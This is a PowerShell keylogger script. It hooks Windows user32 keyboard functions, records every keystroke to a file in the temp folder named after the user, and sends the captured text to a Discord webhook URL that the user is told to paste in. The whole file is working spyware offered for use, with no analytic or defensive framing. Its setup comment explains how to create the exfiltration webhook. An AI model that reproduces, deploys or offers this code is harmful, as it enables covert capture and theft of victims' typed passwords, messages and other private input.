# Change "WEBHOOK" to your discord's webhook. you can create a webhook by going to your discrod servers server settings > integrations > then create a webhook and copy the url
$webhook = "WEKHOOK URL"

$PID > "$env:temp/DdBPKCytRe"

function Keyboard($logFile="$env:temp/$env:UserName.log") {

  $logs = Get-Content "$logFile" | Out-String
  $Body = @{
    'username' = $env:UserName
    'content' = $logs
  }
  Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body

  $generateLog = New-Item -Path $logFile -ItemType File -Force

  # API signatures
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {

        $keystate = $API::GetAsyncKeyState($ascii)

        if ($keystate -eq -32767) {
          $null = [console]::CapsLock

          $mapKey = $API::MapVirtualKey($ascii, 3)

          # create a stringbuilder
          $keyboardState = New-Object Byte[] 256
          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }

  finally {
    # send logs via webhook
    Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
  }
}

# run Keyboard
Keyboard